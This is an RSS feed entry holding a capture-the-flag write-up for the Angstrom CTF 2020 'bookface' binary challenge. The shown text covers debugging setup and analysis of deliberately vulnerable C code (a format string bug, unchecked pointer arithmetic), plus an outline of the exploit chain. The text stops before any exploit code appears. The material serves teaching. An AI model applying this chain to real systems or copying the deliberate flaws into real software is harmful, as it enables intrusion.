<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on philomath213</title><link>https://philomath213.github.io/post/</link><description>Recent content in Posts on philomath213</description><generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><lastBuildDate>Thu, 26 Mar 2020 22:14:39 +0100</lastBuildDate><atom:link href="https://philomath213.github.io/post/index.xml" rel="self" type="application/rss+xml"/><item><title>Angstrom CTF 2020 - bookface</title><link>https://philomath213.github.io/post/angstromctf2020-bookface/</link><pubDate>Thu, 26 Mar 2020 22:14:39 +0100</pubDate><guid>https://philomath213.github.io/post/angstromctf2020-bookface/</guid><description>&lt;h2 id="challenge-details">Challenge details&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:center">Event&lt;/th>
&lt;th style="text-align:center">Challenge&lt;/th>
&lt;th style="text-align:center">Category&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:center">Angstrom CTF 2020&lt;/td>
&lt;td style="text-align:center">bookface&lt;/td>
&lt;td style="text-align:center">PWN&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="description">Description&lt;/h3>
&lt;blockquote>
&lt;p>I made a new social networking service. It&amp;rsquo;s a little glitchy, but no way that could result in a data breach, right?&lt;/p>
&lt;p>Connect with nc pwn.2020.chall.actf.co 20733.&lt;/p>
&lt;/blockquote>
&lt;h3 id="attachments">Attachments&lt;/h3>
&lt;blockquote>
&lt;p>&lt;a href="https://files.actf.co/045bb892badfedab43024208332e2cd03072cc164e2d9c9d74aac29d0cbffeeb/bookface.tar.gz">bookface.tar.gz&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>The attached tarball contains the following files:&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">File&lt;/th>
&lt;th style="text-align:left">Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">bookface&lt;/td>
&lt;td style="text-align:left">the main binary&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">bookface.c&lt;/td>
&lt;td style="text-align:left">binary source code&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">libc.so.6&lt;/td>
&lt;td style="text-align:left">remote server libc&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">Dockerfile&lt;/td>
&lt;td style="text-align:left">Dockerfile used to build the remote challenge&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">xinetd.conf&lt;/td>
&lt;td style="text-align:left">xinetd config file to run the challenge&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">server.sh&lt;/td>
&lt;td style="text-align:left">the executable to be launched via xinetd which will run bookface&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="tldl">TL;DL&lt;/h3>
&lt;ul>
&lt;li>Leak Libc address using Format String Attack.&lt;/li>
&lt;li>Abusing &lt;em>glibc PRNG&lt;/em> by overwrite the random state using &lt;em>friends&lt;/em> pointer.&lt;/li>
&lt;li>Writing a forged &lt;em>FILE&lt;/em> structure in &lt;em>Zero Page&lt;/em>.&lt;/li>
&lt;li>Trigger &lt;em>FILE&lt;/em> structure exploit by a &lt;em>NULL Pointer Dereference Attack&lt;/em> and exploiting a &lt;em>TOCTOU&lt;/em> bug.&lt;/li>
&lt;/ul>
&lt;p>As usually in binary exploitation, binaries are related to &lt;em>libc&lt;/em>, most of the time we need the libc to exploit the binary (calling &lt;em>system&lt;/em> function, overwriting (malloc) or &lt;em>free&lt;/em> hooks, using &lt;em>one_gadget&lt;/em>, &amp;hellip;), so it&amp;rsquo;s better to start debugging using the remote libc locally, there are many ways to achieve that.&lt;/p>
&lt;p>We can easily build an identical docker image to the remote challenge image using these files, but if you want to debug the binary inside a container you need to install your favorite tools (gdb with peda, pwndbg or gef extension) inside the container.&lt;/p>
&lt;p>The easy way that I prefer is patching the binary and modifying the &lt;em>RUNPATH&lt;/em> to point to the directory where the target libc is located, this technique is explained in &lt;a href="https://www.ayrx.me/about">@Ayrx&lt;/a> blog post &lt;strong>&amp;ldquo;Using a non-system glibc&amp;rdquo;&lt;/strong>&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ mv bookface backup
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ python change_glibc.py backup libc.so.6 ld-2.23.so bookface
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Current ld.so:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Path: /lib64/ld-linux-x86-64.so.2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>New ld.so:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Path: /home/philomath213/Documents/CTFs/angstromctf2020/bookface/ld-2.23.so
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Adding RUNPATH:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Path: /home/philomath213/Documents/CTFs/angstromctf2020/bookface
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Writing new binary bookface
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Please rename /home/philomath213/Documents/CTFs/angstromctf2020/bookface/libc.so.6 to /home/philomath213/Documents/CTFs/angstromctf2020/bookface/libc.so.6.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ ldd backup
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> linux-vdso.so.1 &lt;span style="color:#f92672">(&lt;/span>0x00007ffd10964000&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> libc.so.6 &lt;span style="color:#f92672">=&lt;/span>&amp;gt; /usr/lib/libc.so.6 &lt;span style="color:#f92672">(&lt;/span>0x00007f80eaf0f000&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> /lib64/ld-linux-x86-64.so.2 &lt;span style="color:#f92672">=&lt;/span>&amp;gt; /usr/lib64/ld-linux-x86-64.so.2 &lt;span style="color:#f92672">(&lt;/span>0x00007f80eb123000&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ldd bookface
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> linux-vdso.so.1 &lt;span style="color:#f92672">(&lt;/span>0x00007ffe1bbe7000&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> libc.so.6 &lt;span style="color:#f92672">=&lt;/span>&amp;gt; /home/philomath213/Documents/CTFs/angstromctf2020/bookface/libc.so.6 &lt;span style="color:#f92672">(&lt;/span>0x00007ff062cb8000&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> /home/philomath213/Documents/CTFs/angstromctf2020/bookface/ld-2.23.so &lt;span style="color:#f92672">=&lt;/span>&amp;gt; /usr/lib64/ld-linux-x86-64.so.2 &lt;span style="color:#f92672">(&lt;/span>0x00007ff0630ae000&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>N.B.&lt;/strong> You can get &lt;em>ld-2.23.so&lt;/em> file from the &lt;em>ubuntu:xenial&lt;/em> image.&lt;/p>
&lt;p>Now we can run the binary locally with the same libc used remotely.&lt;/p>
&lt;h2 id="source-code-analysis">Source Code Analysis&lt;/h2>
&lt;p>Since the source code is available, we don&amp;rsquo;t have to reverse engineering the binary, just read the code.&lt;/p>
&lt;p>For global variables we have &lt;code>user&lt;/code> a profile structure pointer and &lt;code>uid&lt;/code> an integer.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> profile &lt;span style="color:#f92672">*&lt;/span>user;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> uid;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The profile structure has two fields: a &lt;em>char array&lt;/em> (&lt;code>name&lt;/code>) of size &lt;em>0x100&lt;/em> and a pointer to a &lt;em>long long&lt;/em> (&lt;code>friends&lt;/code>).&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> profile {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> name[&lt;span style="color:#ae81ff">0x100&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>friends; &lt;span style="color:#75715e">// some people have a lot of friends
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>};
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This program first call &lt;code>srand&lt;/code> to set &lt;code>time(NULL)&lt;/code> as seed for a new sequence of pseudo-random integers to be returned by &lt;code>rand()&lt;/code> we will get back to this later in the writeup.&lt;/p>
&lt;p>Then it calls &lt;code>login()&lt;/code>, the &lt;code>login&lt;/code> function basically asks for userid and creates a file with userid as a file name under &lt;code>users&lt;/code> directory.&lt;/p>
&lt;p>If the file doesn&amp;rsquo;t exist, the program will call &lt;code>mmap&lt;/code>, this will basically allocates a memory at a random address, witg a size equals to size of &lt;code>profile&lt;/code> structure, the protections are &lt;em>PROT_READ | PROT_WRITE&lt;/em>. Then it reads &lt;em>0x100&lt;/em> bytes into it using &lt;code>fgets&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Welcome to bookface!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>user &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">mmap&lt;/span>(&lt;span style="color:#a6e22e">rand&lt;/span>() &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xfffffffffffff000&lt;/span>, &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> profile),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PROT_READ &lt;span style="color:#f92672">|&lt;/span> PROT_WRITE, MAP_PRIVATE &lt;span style="color:#f92672">|&lt;/span> MAP_ANONYMOUS &lt;span style="color:#f92672">|&lt;/span> MAP_FIXED,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;What&amp;#39;s your name? &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">fgets&lt;/span>(user&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name, &lt;span style="color:#ae81ff">0x100&lt;/span>, stdin);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If the file already exists then it will ask for a brief survey.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Before you log back in, please complete a brief survey.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;For each of the following categories, rate us from 1-10.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> survey[&lt;span style="color:#ae81ff">20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> n &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Content: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> n &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#a6e22e">read&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>, survey &lt;span style="color:#f92672">+&lt;/span> n, &lt;span style="color:#ae81ff">3&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Moderation: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> n &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#a6e22e">read&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>, survey &lt;span style="color:#f92672">+&lt;/span> n, &lt;span style="color:#ae81ff">3&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Interface: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> n &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#a6e22e">read&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>, survey &lt;span style="color:#f92672">+&lt;/span> n, &lt;span style="color:#ae81ff">3&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Support: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> n &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#a6e22e">read&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>, survey &lt;span style="color:#f92672">+&lt;/span> n, &lt;span style="color:#ae81ff">3&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> survey[n] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The program check if there is any &lt;code>'n'&lt;/code> letter in the inputs, if so the program will exit.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">strchr&lt;/span>(survey, &lt;span style="color:#e6db74">&amp;#39;n&amp;#39;&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> NULL) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// a bug bounty report said something about hacking and the letter n
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;ERROR: HACKING DETECTED&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Exiting...&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">exit&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This would prevent users from doing arbitrary write using &lt;strong>Format String Attack&lt;/strong>&lt;sup id="fnref:2">&lt;a href="#fn:2" class="footnote-ref" role="doc-noteref">2&lt;/a>&lt;/sup> (using the common &lt;em>%n&lt;/em> specifier), if there is any vulnerability like that.&lt;/p>
&lt;p>If the survey rates are different than &lt;em>10, 10, 10, 10&lt;/em>, we notice the format string bug!.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">strcmp&lt;/span>(survey, &lt;span style="color:#e6db74">&amp;#34;10&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">10&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">10&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">10&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">puts&lt;/span>(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Those ratings don&amp;#39;t seem quite right. Please review them and try &amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;again:&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(survey);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> n &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Content: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> n &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#a6e22e">read&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>, survey &lt;span style="color:#f92672">+&lt;/span> n, &lt;span style="color:#ae81ff">3&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Moderation: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> n &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#a6e22e">read&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>, survey &lt;span style="color:#f92672">+&lt;/span> n, &lt;span style="color:#ae81ff">3&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Interface: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> n &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#a6e22e">read&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>, survey &lt;span style="color:#f92672">+&lt;/span> n, &lt;span style="color:#ae81ff">3&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Support: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> n &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#a6e22e">read&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>, survey &lt;span style="color:#f92672">+&lt;/span> n, &lt;span style="color:#ae81ff">3&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> survey[n] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The program will call &lt;code>printf&lt;/code> with user input &lt;code>survey&lt;/code> directly as a format string &lt;code>printf(survey)&lt;/code>, so we have Format String Bug here.&lt;/p>
&lt;p>Then it opens the file and reads its content into an allocated memory via &lt;code>mmap&lt;/code> the same way as mentioned above.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>user &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">mmap&lt;/span>(&lt;span style="color:#a6e22e">rand&lt;/span>() &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xfffffffffffff000&lt;/span>, &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> profile),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PROT_READ &lt;span style="color:#f92672">|&lt;/span> PROT_WRITE, MAP_PRIVATE &lt;span style="color:#f92672">|&lt;/span> MAP_ANONYMOUS &lt;span style="color:#f92672">|&lt;/span> MAP_FIXED,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>FILE &lt;span style="color:#f92672">*&lt;/span>f &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">fopen&lt;/span>(file, &lt;span style="color:#e6db74">&amp;#34;rb&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">fread&lt;/span>(user, &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> profile), f);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">fclose&lt;/span>(f);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>At the end it checks if the survey rates were different then &lt;em>10, 10, 10, 10&lt;/em>, it will set friends number to &lt;em>0&lt;/em>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">strcmp&lt;/span>(survey, &lt;span style="color:#e6db74">&amp;#34;10&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">10&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">10&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">10&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">puts&lt;/span>(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Our survey says... you don&amp;#39;t seem very nice. I doubt you have any &amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;friends!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">*&lt;/span>(user&lt;span style="color:#f92672">-&amp;gt;&lt;/span>friends) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>That&amp;rsquo;s all what login function does, in the other hand the &lt;code>main&lt;/code> function is just menu-driven while loop to choose between:&lt;/p>
&lt;p>&lt;img src="https://philomath213.github.io/post/AngstromCTF2020-bookface/screenshot0.png" alt="screenshot0">&lt;/p>
&lt;ol>
&lt;li>&lt;em>incrementing friends number&lt;/em>&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;How many friends would you like to make? &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> new;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">scanf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34; %lld&amp;#34;&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>new);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>user&lt;span style="color:#f92672">-&amp;gt;&lt;/span>friends &lt;span style="color:#f92672">+=&lt;/span> new;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This will increments the pointer friends, it an obvious mistake.&lt;/p>
&lt;ol start="2">
&lt;li>&lt;em>decrementing friends number&lt;/em>&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;How many friends would you like to lose? &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> lost;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">scanf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34; %lld&amp;#34;&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>lost);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>user&lt;span style="color:#f92672">-&amp;gt;&lt;/span>friends &lt;span style="color:#f92672">-=&lt;/span> lost;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The same here, decrementing the pointer friends.&lt;/p>
&lt;ol start="3">
&lt;li>&lt;em>deleting account&lt;/em>&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Deleting account...&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">sprintf&lt;/span>(file, &lt;span style="color:#e6db74">&amp;#34;users/%d&amp;#34;&lt;/span>, uid);
